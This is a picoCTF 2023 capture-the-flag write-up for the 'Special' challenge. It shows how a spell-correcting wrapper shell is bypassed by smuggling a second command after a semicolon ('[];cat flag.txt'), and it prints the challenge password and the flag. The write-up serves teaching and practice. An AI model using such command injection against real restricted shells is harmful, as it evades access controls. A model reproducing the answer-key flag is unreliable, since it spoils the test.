# Special
| **Platform** | picoCTF 2023 |
| **Category** | General Skills |
| **Difficulty** | Medium |
| **Author** | LT 'syreal' Jones |
| **Tags** | Bash, SSH |

## Challenge

The challenge says:

```text
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes!
```

We are given SSH access to a special shell where commands are automatically modified.

The goal is to understand how the shell transforms our input and use that behavior to read the flag.

## Connection Details

The challenge provides an SSH command similar to:

```bash
ssh -p 54669 ctf-player@saturn.picoctf.net
```

The password is:

```text
483e80d4
```

Connect using:

```bash
ssh -p 54669 ctf-player@saturn.picoctf.net
```

Enter the provided password when prompted.

## Step 1 – Understand the Special Shell

After connecting, normal Linux commands do not work as expected.

For example, trying:

```bash
ls
```

results in something similar to:

```text
Special$ ls
sh: 1: ls: not found
```

The shell is modifying the command before executing it.

The hint says:

```text
Experiment with different shell syntax
```

This suggests that we should try shell syntax that the special spell-checking mechanism does not modify in the same way.

## Step 2 – Try Shell Syntax

We can use shell metacharacters to manipulate how the command is interpreted.

For example:

```bash
Special$ 1;ls
```

The first part may be modified by the special shell, but the `;` allows another command to be executed separately.

The goal is to get the normal `ls` command executed.

After experimenting with shell syntax, we can access the files in the directory.

## Step 3 – Find the Flag File

The directory contains:

```text
flag.txt
```

However, directly typing:

```bash
cat flag.txt
```

gets modified by the special shell.

Instead, we can use shell syntax to bypass the transformation.

For example:

```bash
[];cat flag.txt
```

The important part is the semicolon:

```text
;
```

It separates shell commands.

The special shell processes the first part, while the command after the semicolon can be executed by the underlying shell.

## Step 4 – Read the Flag

Execute:

```bash
[];cat flag.txt
```

The underlying shell executes:

```bash
cat flag.txt
```

and displays the flag.

The terminal output shows:

```text
picoCTF{5p3llch3ck_15_7h3_w0r57_b741d1db1}
```

## Why This Works

The challenge uses a custom shell that attempts to modify commands before executing them.

Normal input:

```bash
cat flag.txt
```

gets transformed incorrectly.

But shell command separators such as:

```text
;
```

allow us to inject another command.

Conceptually:

```text
Special Shell
     |
     v
[] ; cat flag.txt
     |
     v
Underlying /bin/sh
     |
     v
cat flag.txt
     |
     v
Flag
```

The key technique is understanding that the special shell eventually executes commands through a normal shell.

## Important Command

The command used to retrieve the flag is:

```bash
[];cat flag.txt
```

## Commands Used

Connect through SSH:

```bash
ssh -p 54669 ctf-player@saturn.picoctf.net
```

Try listing files:

```bash
ls
```

Use shell syntax:

```bash
[];ls
```

Read the flag:

```bash
[];cat flag.txt
```

## Flag

```text
picoCTF{5p3llch3ck_15_7h3_w0r57_b741d1db1}
```

## Tools Used

- SSH
- Linux Shell
- Bash / `sh`
- `ls`
- `cat`
- Shell metacharacters
- Command separators

## Key Learning

- Custom shells may modify commands before executing them.
- Shell metacharacters can change how commands are interpreted.
- The semicolon `;` separates commands in a shell.
- Understanding the underlying shell can help bypass restrictions imposed by a wrapper.
- Always experiment with shell syntax when a challenge specifically hints at it.

## Final Solution

```text
Connect using SSH
        ↓
ssh -p 54669 ctf-player@saturn.picoctf.net
        ↓
Enter the provided password
        ↓
Normal commands are modified
        ↓
Experiment with shell syntax
        ↓
Use ;
        ↓
[];ls
        ↓
Find flag.txt
        ↓
[];cat flag.txt
        ↓
Underlying shell executes cat flag.txt
        ↓
Flag
``` 
